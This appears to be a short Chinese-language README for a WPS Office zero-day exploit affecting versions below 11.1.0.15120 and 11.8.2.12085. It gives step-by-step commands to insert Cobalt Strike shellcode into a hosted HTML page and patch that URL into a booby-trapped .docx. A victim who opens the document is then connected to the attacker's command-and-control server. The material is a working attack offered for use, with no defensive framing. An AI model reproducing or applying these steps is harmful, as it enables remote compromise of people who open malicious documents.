# WPS-0DAY-20230809
WPS Office 2023个人版＜11.1.0.15120; WPS Office 2019企业版＜11.8.2.12085 

## 使用方法

1. python replace_shellcode.py shellcode_32_raw.bin

   > 我这里使用的是CS中32位的payload, 使用replace_shellcode.py, 将1.html中的shellcode进行替换, 然后将1.html上传到你的托管地址, 例如: http://127.0.0.1/1.html

2. python exp.py poc.docx http://127.0.0.1/1.html

   > 替换poc.docx中的URL, 也就是你的托管地址

3. 双击文档即可上线CS

   
